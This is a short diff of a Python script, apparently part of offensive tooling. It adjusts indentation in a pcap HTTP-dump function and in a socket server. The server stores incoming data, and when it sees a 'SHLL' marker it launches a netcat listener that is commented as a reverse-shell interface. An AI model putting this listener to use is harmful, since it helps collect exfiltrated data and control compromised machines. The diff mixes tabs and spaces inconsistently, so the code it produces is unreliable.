@@ -19,7 +19,7 @@ def get_http_headers(payload):
     return headers
 
 def pcap_http_dump(pcap_fn, dump_fn):
-	fd = open('%s' % (dump_fn), 'a+')
+    fd = open('%s' % (dump_fn), 'a+')
     p = rdpcap(pcap_fn)
     sessions = p.sessions()
     payload = [] # init http data cotainer
@@ -59,11 +59,11 @@ if __name__ == '__main__':
 	        	data = conn.recv(1024)
 	        	# print('data: %s', (data))
 	   	    	if not data:
-	      	      break
+				break
 	        	# write data to a file
 	        	f.write(data)
 		    f.close()
-		if data[0:4] == 'SHLL':
+		    if data[0:4] == 'SHLL':
 			call(["nc", "-lvp", str(port)]) # use the terminal as reverse shell interface
 
 	conn.close()
